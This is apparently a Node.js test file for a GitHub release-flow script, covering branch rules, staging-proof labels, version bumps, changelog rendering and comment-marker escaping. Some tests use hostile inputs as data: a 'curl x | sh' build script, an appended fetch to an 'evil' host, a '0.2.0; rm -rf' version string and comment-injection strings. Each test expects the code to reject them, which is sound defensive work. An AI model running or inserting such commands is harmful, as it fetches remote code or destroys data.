// Run: node --test .github/scripts/release-flow.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  isReleaseOrHotfixHead, flowEnabled, releaseExtraFiles, proofLink, heldOffNote, isBackMerge, labelProblem,
  pickPr, prState, releaseVersion, firstParagraph, releaseNotesModule, changelogSection, nextVersion, versionFromTitle, groupChangelog, usersSee, gateState, renderReleaseBody, changelogMarkdown, cell, neutralizeCommentMarkers, dropComments, botFileProblems, versionProblems,
} from './release-flow.mjs';

test('only release/next and hotfix/<name> may open a PR into main', () => {
  for (const ok of ['release/next', 'hotfix/fix-x', 'hotfix/2026-11-10-cents']) assert.equal(isReleaseOrHotfixHead(ok), true, ok);
  for (const bad of ['hotfix/', 'release/v1.0.0', 'release/next/x', 'hotfix/fix/extra', 'main', 'staging', 'taha/x', 'claude/hotfix/x', '', undefined]) {
    assert.equal(isReleaseOrHotfixHead(bad), false, String(bad));
  }
});

test('the flow is enforced only when RELEASE_FLOW is exactly "on"', () => {
  assert.equal(flowEnabled({ RELEASE_FLOW: 'on' }), true);
  for (const v of [undefined, '', 'On', 'true', 'off']) assert.equal(flowEnabled({ RELEASE_FLOW: v }), false, String(v));
});

test('release/next may differ from staging + main only in the bot\'s files', () => {
  assert.deepEqual(releaseExtraFiles(['package.json', 'package-lock.json', 'CHANGELOG.md', 'src/releaseNotes.ts']), []);
  assert.deepEqual(releaseExtraFiles(['CHANGELOG.md', 'src/lib/money.ts']), ['src/lib/money.ts']);
});

test('proofLink finds the first https "Staging proof:" line in the body or any comment', () => {
  assert.equal(proofLink(['Summary\nStaging proof: https://a.example/1']), 'https://a.example/1');
  assert.equal(proofLink(['no proof here', 'later comment\n  staging proof:https://b.example/x?y=1  ']), 'https://b.example/x?y=1');
  assert.equal(proofLink(['Staging proof: http://insecure.example']), null);
  assert.equal(proofLink(['Staging proof: <link>']), null);
  assert.equal(proofLink(['Staging proof: soon']), null);
  assert.equal(proofLink(['Staging proof:\nhttps://a.example/1']), null); // link must be on the same line
  assert.equal(proofLink(['Staging proof: https://']), null);
  assert.equal(proofLink(['Staging proof: https://localhost/x']), null);
  assert.equal(proofLink(['Staging proof: nope\nStaging proof: https://c.example/2']), 'https://c.example/2');
  assert.equal(proofLink([null, undefined, '']), null);
});

test('heldOffNote needs some text after "Held off:"', () => {
  assert.equal(heldOffNote(['Held off: #1712 reverts it']), '#1712 reverts it');
  assert.equal(heldOffNote(['held off:   flag bill_split_v2 off']), 'flag bill_split_v2 off');
  assert.equal(heldOffNote(['Held off: https://github.com/o/r/pull/9']), 'https://github.com/o/r/pull/9');
  assert.equal(heldOffNote(['Held off:', 'Held off:   ']), null);
  assert.equal(heldOffNote(['Held off: maybe later']), null);
  assert.equal(heldOffNote(['Held off: https://example.com/weather']), null);
  assert.equal(heldOffNote(['Held off: maybe later\nHeld off: #123 reverts it']), '#123 reverts it');
});

test('a back-merge PR has main as its head', () => {
  assert.equal(isBackMerge('main'), true);
  for (const ref of ['staging', 'taha/main', 'release/next', undefined]) assert.equal(isBackMerge(ref), false, String(ref));
});

test('labelProblem explains what is missing, or returns null', () => {
  const merged = { merged: true, baseRef: 'staging' };
  assert.equal(labelProblem({ ...merged, label: 'verified-on-staging', texts: ['Staging proof: https://x.example'] }), null);
  assert.match(labelProblem({ ...merged, label: 'verified-on-staging', texts: ['looks good'] }), /Staging proof: <link>/);
  assert.match(labelProblem({ merged: false, baseRef: 'staging', label: 'verified-on-staging', texts: ['Staging proof: https://x.example'] }), /after the PR is merged into staging/);
  assert.match(labelProblem({ merged: true, baseRef: 'main', label: 'held-off', texts: ['Held off: flag'] }), /after the PR is merged into staging/);
  assert.equal(labelProblem({ ...merged, label: 'held-off', texts: ['Held off: #1712'] }), null);
  assert.match(labelProblem({ ...merged, label: 'held-off', texts: [] }), /Held off: <revert PR or flag name>/);
  assert.equal(labelProblem({ ...merged, label: 'on-staging', texts: [] }), null);
  assert.match(labelProblem({ merged: false, baseRef: 'staging', label: 'on-staging', texts: [] }), /after the PR is merged into staging/);
  assert.match(labelProblem({ ...merged, headRef: 'main', label: 'verified-on-staging', texts: ['Staging proof: https://x.example'] }), /back-merge/);
  assert.equal(labelProblem({ ...merged, label: 'bug', texts: [] }), null);
});

test('pickPr trusts only a PR merged into staging as exactly this commit', () => {
  const sha = 'a'.repeat(40);
  const good = { number: 7, merge_commit_sha: sha, base: { ref: 'staging' }, merged_at: '2026-11-10T00:00:00Z' };
  assert.equal(pickPr(sha, [good]), good);
  assert.equal(pickPr(sha, [{ ...good, merge_commit_sha: 'b'.repeat(40) }]), null); // a commit that only mentions an old PR
  assert.equal(pickPr(sha, [{ ...good, base: { ref: 'main' } }]), null);
  assert.equal(pickPr(sha, [{ ...good, merged_at: null }]), null);
  assert.equal(pickPr(sha, []), null);
});

test('nextVersion: release bumps minor, hotfix bumps patch, v0.1.0 first', () => {
  assert.equal(nextVersion([], 'release'), 'v0.1.0');
  assert.equal(nextVersion(['v0.1.0', 'v0.2.0', 'v0.1.3'], 'release'), 'v0.3.0');
  assert.equal(nextVersion(['v0.2.0', 'v0.2.1'], 'hotfix'), 'v0.2.2');
  assert.equal(nextVersion(['v1.0.0', 'nightly', 'v2', 'v0.9.9-rc1'], 'release'), 'v1.1.0');
  assert.equal(nextVersion([], 'hotfix'), 'v0.0.1');
});

test('versionFromTitle keeps a version the releaser typed', () => {
  assert.equal(versionFromTitle('release: v1.0.0'), 'v1.0.0');
  assert.equal(versionFromTitle('Release: v0.4.0 '), 'v0.4.0');
  assert.equal(versionFromTitle('release: soon'), null);
  assert.equal(versionFromTitle('release: v1.02.0'), null);
  assert.equal(versionFromTitle('release: V1.0.0'), 'v1.0.0');
  assert.equal(releaseVersion('release: V1.0.0', ['v0.2.0']), 'v1.0.0');
  assert.equal(versionFromTitle(undefined), null);
});

test('groupChangelog sorts by conventional-commit type', () => {
  const g = groupChangelog([
    { number: 1, title: 'feat(billing): split bills' },
    { number: 2, title: 'fix: one cent' },
    { number: 3, title: 'docs(x): notes' },
    { number: 4, title: 'refactor!: tidy' },
    { number: 5, title: 'Revert "feat: x"' },
    { number: 6, title: 'feat!: breaking thing' },
  ]);
  assert.deepEqual(g.features.map((p) => p.number), [1, 6]);
  assert.deepEqual(g.fixes.map((p) => p.number), [2]);
  assert.deepEqual(g.chores.map((p) => p.number), [3, 4]);
  assert.deepEqual(g.other.map((p) => p.number), [5]);
  assert.match(changelogMarkdown(g), /#### ✨ New Features\n\* split bills \(#1\)/);
  assert.match(changelogMarkdown(g), /#### 🧩 Other\n\* Revert "feat: x" \(#5\)/);
});

test('usersSee reads the "What users see" line or section', () => {
  assert.deepEqual(usersSee('Summary\nWhat users see: Quotes show the booked price.\n'), ['Quotes show the booked price.']);
  assert.deepEqual(usersSee('## What users see\n- New Bill Split button\n- Payer table\n\n## Follow-ups\n- None'), ['New Bill Split button', 'Payer table']);
  assert.deepEqual(usersSee('What users see: nothing'), []);
  assert.deepEqual(usersSee('What users see: None.'), []);
  assert.deepEqual(usersSee(null), []);
});

test('gateState blocks unverified PRs, labels whose evidence is gone, and commits without a PR', () => {
  const ok = gateState([
    { number: 1, labels: ['on-staging', 'verified-on-staging'], body: 'x', comments: ['Staging proof: https://x.example/1'] },
    { number: 2, labels: ['held-off'], body: 'Held off: flag bill_split_v2 off' },
  ], []);
  assert.deepEqual(ok, { ok: true, blocking: [] });
  const bad = gateState([
    { number: 1, labels: ['on-staging'], body: '' },
    { number: 2, labels: ['verified-on-staging'], body: 'proof was here once' },
    { number: 3, labels: ['held-off'], body: '' },
  ], ['hand-made commit']);
  assert.equal(bad.ok, false);
  assert.deepEqual(bad.blocking, ['#1', '#2 (label without its proof or reason)', '#3 (label without its proof or reason)', 'commit without a PR: hand-made commit']);
  assert.equal(gateState([], []).ok, false); // nothing to release is not a green release
});

test('renderReleaseBody fills bot blocks and keeps what people wrote', () => {
  const template = 'v <!-- bot:version -->x<!-- /bot:version -->\n- [ ] Major\nNotes: [Yes/No]\n<!-- bot:changelog --><!-- /bot:changelog -->';
  const first = renderReleaseBody(template, { version: 'v0.1.0', changelog: 'A' });
  assert.equal(first, 'v <!-- bot:version -->v0.1.0<!-- /bot:version -->\n- [ ] Major\nNotes: [Yes/No]\n<!-- bot:changelog -->\nA\n<!-- /bot:changelog -->');
  const edited = first.replace('- [ ] Major', '- [x] Major').replace('[Yes/No]', 'No');
  const second = renderReleaseBody(template, { version: 'v0.1.0', changelog: 'B' }, edited);
  assert.match(second, /- \[x\] Major/);
  assert.match(second, /Notes: No/);
  assert.match(second, /<!-- bot:changelog -->\nB\n<!-- \/bot:changelog -->/);
  assert.equal(renderReleaseBody(template, { version: 'v1' }, null).includes('<!-- bot:changelog --><!-- /bot:changelog -->'), true);
  const sneaky = renderReleaseBody(template, { version: 'v1', changelog: 'x <!-- /bot:changelog --> stuck' });
  assert.match(sneaky, /<!-- bot:changelog -->\nx &lt;!-- \/bot:changelog --&gt; stuck\n<!-- \/bot:changelog -->/);
  // Nothing is removed, so pieces can't rebuild a marker; --!> also ends a comment.
  const rebuilt = renderReleaseBody(template, { version: 'v1', changelog: 'a <<!--!-- /bot:changelog --!> b' });
  assert.equal(rebuilt.match(/<!--/g).length, 4);
  assert.match(rebuilt, /\na <&lt;!--!-- \/bot:changelog --!&gt; b\n/);
  // Linear: a long crafted value is handled in one pass.
  const big = '<'.repeat(20000) + '!--'.repeat(20000);
  assert.equal(neutralizeCommentMarkers(big).includes('<!--'), false);
});

test('firstParagraph skips headings and comments and trims long text', () => {
  assert.equal(firstParagraph('## What changes (plain English)\n\nThe wrapper now stops.\nOn round 3.'), 'The wrapper now stops. On round 3.');
  assert.equal(firstParagraph('<!-- note -->\n## What\nFixes the red check.'), 'Fixes the red check.');
  assert.equal(firstParagraph('x'.repeat(250)).length, 201);
  assert.equal(firstParagraph('Shown. <!-- never closed\n\nhidden'), 'Shown. &lt;!-- never closed');
  assert.equal(firstParagraph('<<!-- a -->!-- b'), '&lt;!-- b');
  assert.equal(firstParagraph('Deploy A --> B'), 'Deploy A --&gt; B');
  assert.equal(firstParagraph('Docs: `<!--` is shown.\n\nMore.'), 'Docs: `&lt;!--` is shown.');
  assert.equal(dropComments('a <!-- x --> b <!-- y --!> c <!-- open'), 'a  b  c <!-- open');
  // Linear: many unclosed openers.
  const many = '<!--'.repeat(50000);
  const t = Date.now(); assert.equal(dropComments(many), many); assert.ok(Date.now() - t < 1000);
  const closed = '<!---->x'.repeat(50000);
  const t2 = Date.now(); assert.equal(dropComments(closed), 'x'.repeat(50000)); assert.ok(Date.now() - t2 < 1000);
  assert.equal(firstParagraph(null), '');
  assert.equal(firstParagraph('What users see: <one plain sentence>\n\nReal summary.'), 'Real summary.');
});

test('releaseNotesModule writes a safe TypeScript literal', () => {
  const src = releaseNotesModule({ version: '0.1.0', date: '2026-11-12', items: ['Quotes show "booked" prices`${x}`', 'Line\nbreak'] });
  assert.match(src, /export const releaseNotes: ReleaseNotes = \{/);
  const literal = src.slice(src.indexOf('= ') + 2, src.lastIndexOf(';'));
  assert.deepEqual(JSON.parse(literal).items, ['Quotes show "booked" prices`${x}`', 'Line\nbreak']);
});

test('changelogSection returns one version\'s notes from CHANGELOG.md', () => {
  const md = '# Changelog\n\nIntro.\n\n## v0.2.0 (2026-11-19)\n\n#### ✨ New Features\n* b (#2)\n\n## v0.1.0 (2026-11-12)\n\n#### 🐛 Bug Fixes\n* a (#1)\n';
  assert.equal(changelogSection(md, 'v0.2.0'), '#### ✨ New Features\n* b (#2)');
  assert.equal(changelogSection(md, 'v0.1.0'), '#### 🐛 Bug Fixes\n* a (#1)');
  assert.equal(changelogSection(md, 'v0.3.0'), null);
  assert.equal(changelogSection(md, 'v0.1.00'), null);
  assert.equal(changelogSection('## v1.2.3+build.4 (2026-12-15)\n\n* x (#9)\n', 'v1.2.3+build.4'), '* x (#9)');
});

test('releaseVersion keeps a typed version only if it is newer than everything shipped', () => {
  assert.equal(releaseVersion('release: v1.0.0', ['v0.2.0']), 'v1.0.0');
  assert.equal(releaseVersion('release: v0.1.0', ['v0.2.0']), 'v0.3.0');
  assert.equal(releaseVersion('release: v0.2.0', ['v0.2.0']), 'v0.3.0');
  assert.equal(releaseVersion('release: v0.2.1', ['v0.2.0']), 'v0.2.1');
  assert.equal(releaseVersion(undefined, ['v0.2.0', 'v0.0.0']), 'v0.3.0');
});

test('usersSee ignores the template placeholder and indented headings end the list', () => {
  const tpl = '## What users see\nWhat users see: <one plain sentence, or "None">\n- Real change\n  ## Follow-ups\n- None';
  assert.deepEqual(usersSee(tpl), ['Real change']);
  assert.deepEqual(usersSee('What users see: <one plain sentence>'), []);
});

test('prState: held-off needs its reason even when also verified', () => {
  assert.equal(prState({ labels: ['held-off', 'verified-on-staging'], body: 'Staging proof: https://x.example' }), 'missing');
  assert.equal(prState({ labels: ['held-off'], body: 'Held off: #12' }), 'held');
  assert.equal(prState({ labels: ['verified-on-staging'], body: '' }), 'missing');
  assert.equal(prState({ labels: ['on-staging'], body: '' }), 'unverified');
});

test('cell escapes backslashes before pipes, so a title cannot break the status table', () => {
  assert.equal(cell('a|b'), 'a\\|b');
  assert.equal(cell('a\\|b'), 'a\\\\\\|b');
  assert.equal(cell('plain'), 'plain');
  assert.equal(cell('Fix\n| #999 | ✅ verified |'), 'Fix \\| #999 \\| ✅ verified \\|');
  assert.equal(cell('</td><td>✅ verified'), '&lt;/td>&lt;td>✅ verified');
});

test('botFileProblems: release/next may change only the version and the generated notes', () => {
  const pkg = (o) => `${JSON.stringify(o, null, 2)}\n`;
  const base = { name: 'crx', version: '0.1.0', scripts: { build: 'vite build' } };
  assert.deepEqual(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0' })), []);
  assert.match(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0', scripts: { build: 'curl x | sh' } }))[0], /outside its version/);
  const lock = { name: 'crx', version: '0.1.0', packages: { '': { version: '0.1.0' }, 'node_modules/a': { version: '1.0.0' } } };
  assert.deepEqual(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, version: '0.2.0', packages: { ...lock.packages, '': { version: '0.2.0' } } })), []);
  assert.match(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, packages: { ...lock.packages, 'node_modules/a': { version: '6.6.6' } } }))[0], /outside its version/);
  const notes = releaseNotesModule({ version: '0.2.0', date: '2026-11-19', items: ['Faster invoices.'] });
  assert.deepEqual(botFileProblems('src/releaseNotes.ts', 'old', notes), []);
  assert.match(botFileProblems('src/releaseNotes.ts', 'old', `${notes}fetch('https://evil');\n`)[0], /module the bot writes/);
  assert.match(botFileProblems('src/releaseNotes.ts', 'old', notes.replace('"items"', '"x": 1, "items"'))[0], /module the bot writes/);
  assert.match(botFileProblems('src/releaseNotes.ts', 'old', null)[0], /is missing/);
  const log = '# Changelog\n\n## v0.1.0 (2026-11-12)\n\n- A\n';
  assert.deepEqual(botFileProblems('CHANGELOG.md', log, log.replace('\n\n## v0.1.0', '\n\n## v0.2.0 (2026-11-19)\n\n- B\n\n## v0.1.0')), []);
  assert.match(botFileProblems('CHANGELOG.md', log, '# Changelog\n')[0], /lost earlier release/);
  assert.match(botFileProblems('CHANGELOG.md', log, null)[0], /missing/);
  assert.match(botFileProblems('CHANGELOG.md', null, null)[0], /missing/);
});

test('versionProblems: one plain X.Y.Z across package.json, the lock and the notes', () => {
  const j = (o) => JSON.stringify(o);
  const notes = (v) => releaseNotesModule({ version: v, date: '2026-11-19', items: [] });
  const lock = (a, b) => j({ version: a, packages: { '': { version: b } } });
  assert.deepEqual(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.2.0'), notes('0.2.0')), []);
  assert.match(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.3.0'), notes('0.2.0'))[0], /isn't one X.Y.Z/);
  assert.match(versionProblems(j({ version: '0.2.0; rm -rf' }), lock('0.2.0; rm -rf', '0.2.0; rm -rf'), notes('0.2.0; rm -rf'))[0], /isn't one X.Y.Z/);
  assert.match(versionProblems(null, lock('0.2.0', '0.2.0'), notes('0.2.0'))[0], /missing or unreadable/);
  assert.match(versionProblems(j({ version: '01.2.3' }), lock('01.2.3', '01.2.3'), notes('01.2.3'))[0], /isn't one X.Y.Z/);
});
